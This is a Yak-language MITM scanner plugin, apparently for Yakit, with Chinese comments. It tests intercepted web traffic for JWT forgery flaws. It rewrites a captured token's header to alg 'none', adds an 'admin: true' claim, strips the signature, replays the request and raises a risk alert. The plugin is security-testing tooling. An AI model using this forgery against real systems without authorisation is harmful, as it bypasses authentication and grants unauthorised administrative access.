
description="JWT（JSON Web Token）伪造漏洞是指攻击者利用未经充分保护的JWT令牌来伪造、篡改或重放令牌，从而绕过身份验证机制或获取未经授权的访问权限。JWT通常用于在不同系统之间安全地传递声明信息，但如果未正确实施和验证，可能会导致安全漏洞。"
solution="以下是一些防止JWT伪造漏洞的常见解决方案：1.使用HTTPS：确保JWT令牌在传输过程中受到加密保护，避免令牌被窃取或篡改。\n2.令牌签名：对JWT令牌进行签名，并使用密钥进行验证，确保令牌的完整性和真实性。\n3.避免敏感信息存储：避免在JWT令牌中存储敏感信息，尽量减少令牌中的数据量，以减少泄露的风险。\n4.实施多因素身份验证：结合其他身份验证措施，如密码、双因素身份验证等，提高系统的安全性。"
detect_output_dic={}
risk_output_dic={}
flow_total=-1



bad_end_str_list=[
".jpg", ".png", ".gif", ".css", ".js", ".pdf", ".mp3", ".mp4", ".avi", ".map", ".svg", ".ico", ".woff", ".woff2", ".ttf"
]


mitm_risk_output=func(url,req,rsp,vul_type,vul_name,vul_severity,param,payload,payload_success_flag,pocname){
    // 计算url和string后的body md5进行去重
    if task_type[0]=="即时" || task_type[0]=="定时" {
        // 计算url和string后的body md5进行去重
        header_md5_check,body_md5_check=poc.Split(req)
        url_body_hash=codec.Md5(url+string(body_md5_check))
        if url_body_hash in risk_output_dic{
            //该条流已经告警输出，不再进行告警
            return
        }else{
            //记录到告警去重字典中
            risk_output_dic[url_body_hash]=1
        }

        //记录到检测去重字典中,借助库函数，拼接root_url和path
        detect_root_url=str.ParseStringUrlToWebsiteRootPath(url)
        detect_url_Instance,err=str.ParseStringUrlToUrlInstance(url)
        if err!=nil{
            die(err)
        }
        detect_path=detect_url_Instance.Path
        detect_url_path_hash=codec.Md5(detect_root_url+detect_path)
        if detect_url_path_hash in detect_output_dic{
            //该条流已经检测，后续 mirrorFilteredHTTPFlow 不再进行检测
        }else{
            //记录到检测去重字典中
            detect_output_dic[detect_url_path_hash]=1
        }
    }

    risk.NewRisk(
        url,
        risk.title(f"发现 ${url} 中存在 ${vul_name} 漏洞"),
        risk.type(vul_type),
        risk.severity(vul_severity),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.parameter(param),
        risk.payload(payload),
        risk.solution(solution),
        risk.description(description),
        risk.details({
            "location":url,
            "pocname":pocname,
            "payload_success_flag":payload_success_flag,
            "recognition_patten":recognition_patten_dic[recognition_patten[0]]
        })
        )
}




header_handle=func(header){
    header_json=json.loads(header)
    header_json["alg"]="none"
    header_=json.dumps(header_json,json.withIndent(""))
    header_base64=codec.EncodeBase64Url(header_)
    return header_base64
}


payload_handle=func(payload){
    payload_json=json.loads(payload)
    payload_json["admin"]="true"
    payload_=json.dumps(payload_json)
    payload_base64=codec.EncodeBase64Url(payload_)
    return payload_base64
}


pre_check=func(req,rsp){
    http_req = poc.ParseBytesToHTTPRequest(req)~

    if http_req.Method!="GET" && http_req.Method!="POST" {
        return false
    }

    if str.MatchAnyOfSubString(http_req.URL.Path, bad_end_str_list...) {
        return false
    }

    http_rsp=poc.ParseBytesToHTTPResponse(rsp)~

    // if str.MatchAnyOfRegexp(http_rsp.StatusCode, ["40\\d","50\\d"]...){
    //     return false
    // }

    // http_rsp_header,http_rsp_body=poc.Split(rsp)
    // // 启用非json形式的检查
    // if not_json_check{
    //     return true
    // }

    // http_rsp_json_body=json.loads(string(http_rsp_body))
    // if http_rsp_json_body == {} {
    //     return false
    // }

    return true
}




jwt_position=cli.StringSlice("jwt_position", cli.setMultipleSelect(false),cli.setSelectOption("cookie", "cookie"),cli.setSelectOption("header", "header"),cli.setVerboseName("jwt 凭证位置"),cli.setRequired(true),cli.setDefault("cookie"))
sim_value=cli.Float("sim_value", cli.setDefault("0.3"),cli.setVerboseName("相似度阈值"),cli.setCliGroup("插件额外参数"),cli.setHelp("小于等于该阈值告警"))

//开始替换内容标志recognition_patten
//待替换内容，勿动！
recognition_patten=cli.StringSlice("recognition_patten", cli.setVerboseName("识别模式"),cli.setMultipleSelect(false),cli.setSelectOption("字典模式", "1"),cli.setSelectOption("机器学习模式", "2"),cli.setSelectOption("字典模式优先-机器学习辅助", "3"),cli.setSelectOption("字典模式-机器学习并行", "4"),cli.setSelectOption("机器学习优先-字典模式辅助", "5"),cli.setDefault("1"),cli.setHelp("检测识别模式"),cli.setCliGroup("插件额外参数"))
//结束替换内容标志recognition_patten

//开始替换内容标志task_type
//待替换内容，勿动！
task_type=cli.StringSlice("task_type", cli.setVerboseName("任务类型"),cli.setMultipleSelect(false),cli.setSelectOption("即时", "即时"),cli.setDefault("即时"),cli.setHelp("任务类型，mitm都为即时任务"),cli.setCliGroup("插件额外参数"))
//结束替换内容标志task_type

// 去对应位置 header/cookie，正则寻找 eyJ开头的值
cli.check()
jwt_position=jwt_position[0]
// 定义全局变量
recognition_patten_dic={
    "1":"字典模式",
    "2":"机器学习模式",
    "3":"字典模式优先-机器学习辅助",
    "4":"字典模式-机器学习并行",
    "5":"机器学习优先-字典模式辅助",
}
// RFC规范不会用作jwt
HTTP_HEADER_DIC={
    "Accept":1,
    "Accept-Charset":1,
    "Accept-Encoding":1,
    "Accept-Language":1,
    "Accept-Ranges":1,
    "Cache-Control":1,
    "Connection":1,
    "Pragma":1,
    "Sec-Fetch-Dest":1,
    "Sec-Fetch-Mode":1,
    "Sec-Fetch-Site":1,
    "Sec-Fetch-User":1,
    "Upgrade-Insecure-Requests":1,
    "Content-Language":1,
    "Content-MD5":1,
    "Content-Range":1,
    "Content-Length":1,
    "Content-Type":1,
    "Host":1,
    "If-Match":1,
    "Range":1,
    "Referer":1,
    "User-Agent":1,
    "X-Forwarded-For":1,
    "X-RateLimit-Limit":1,
    "X-RateLimit-Remaining":1,
    "X-RateLimit-Reset":1,
    "X-Request-ID":1,
    "sec-ch-ua":1,
    "sec-ch-ua-mobile":1,
    "sec-ch-ua-platform":1,
    "packet_flag_id":1
}


// 定义用于打印的 base_info 变量
base_info_script_name="漏洞名"
base_info_task_creater=""
base_info_task_type=task_type[0]
base_info_detect_mode="mitm"
base_info_task_mode=recognition_patten_dic[recognition_patten[0]]
base_info_login=""
base_info_crediential=""
base_info_user_define_header=""
base_info_start_time=time.Now().String()
base_info_end_time=""


// 定义打印函数
base_info_output=func(){
    yakit_output(f"加载插件结束。配置的基本信息如下：任务名称为'${base_info_script_name}'、任务创建人为'${base_info_task_creater}'、任务类型为'${base_info_task_type}任务'、检测模式为'${base_info_detect_mode}模式'、任务模式为'${base_info_task_mode}'、登录入口信息为'${base_info_login}'、凭证信息为'${base_info_crediential}'、自定义请求头信息为'${base_info_user_define_header}'、任务开始时间为 ${base_info_start_time}、结束时间为${base_info_end_time}。")
}
base_info_output()



# mirrorFilteredHTTPFlow 劫持到的流量为 MITM 自动过滤出的可能和 "业务" 有关的流量，会自动过滤掉 js / css 等流量
mirrorFilteredHTTPFlow = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {


    // 手动对爬虫预检测流量进行过滤，yakit加载mitm插件时，建议注释，动态爬虫形式调用无需注释（当爬虫启用crawlerx.check()需要注释）
    // if flow_total==-1{
    //     flow_total=flow_total+1
    //     return
    // }

    detect_root_url=str.ParseStringUrlToWebsiteRootPath(url)
    detect_url_Instance,err=str.ParseStringUrlToUrlInstance(url)
    if err!=nil{
        yakit_output("url 解析错误，脚本即将退出")
        die(err)
    }

    detect_path=detect_url_Instance.Path
    detect_url_path_hash=codec.Md5(detect_root_url+detect_path)
    // 考虑去重策略 即时/定时 任务去重（因为任务本身也只跑一次），周期任务不去重
    if task_type[0]=="即时" || task_type[0]=="定时"{
        if detect_url_path_hash in detect_output_dic{
            //该条流已经检测并告警，不再进行检测
            yakit_output("detect_output_dic 去重")
            return
        }

        // 计算url和string后的body md5进行去重
        header_md5_check,body_md5_check=poc.Split(req)
        url_body_hash=codec.Md5(url+string(body_md5_check))
        if url_body_hash in risk_output_dic{
            //该条流已经告警输出，不再进行检测
            yakit_output("risk_output_dic 去重")
            return
        }
    }

    if !pre_check(req,rsp){
        return
    }
    yakit_output(f"开始对 ${url} 的JWT伪造检测")

    freq=fuzz.HTTPRequest(req,fuzz.https(isHttps))~
    cookie_param,raw_header_list,jwt_flag,jwt_param=freq.GetCookieParams(),freq.GetHeaderKeys(),false,nil

    switch jwt_position{
        case "header":
            for raw_header in raw_header_list{
                if raw_header not in HTTP_HEADER_DIC && freq.GetHeader(raw_header).StartsWith("eyJ") {
                    jwt_flag,jwt_param=true,freq.GetHeaderParamByName(raw_header)
                    break
                }
            }
        case "cookie":
            for param in cookie_param{
                if param.GetFirstValue().StartsWith("eyJ"){
                    jwt_flag,jwt_param=true,param
                    break
                }
            }
    }

    if !jwt_flag{
        yakit_output("未找到 jwt token，插件即将退出")
        return
    }


    jwt_without_sign=str.Split(jwt.RemoveAlg(jwt_param.GetFirstValue())~,".")
    header,payload,other=string(codec.DecodeBase64(jwt_without_sign[0])~),string(codec.DecodeBase64(jwt_without_sign[1])~),string(codec.DecodeBase64(jwt_without_sign[2])~)
    jwt_forge=header_handle(header)+"."+payload_handle(payload)+"."
    result=jwt_param.Fuzz(jwt_forge).ExecFirst()~

    fuzz_header,fuzz_body=poc.Split(result.ResponseRaw)

    if string(fuzz_body)!=nil && str.CalcSimilarity(body,fuzz_body)<=sim_value{
        mitm_risk_output(result.Url, string(result.RequestRaw), string(result.ResponseRaw), "逻辑漏洞", "JWT伪造", "high", jwt_param.Name(), jwt_forge, "", "mitm_jwt_forge_check")
    }
    yakit_output(f"完成对 ${url} 的JWT伪造检测")


}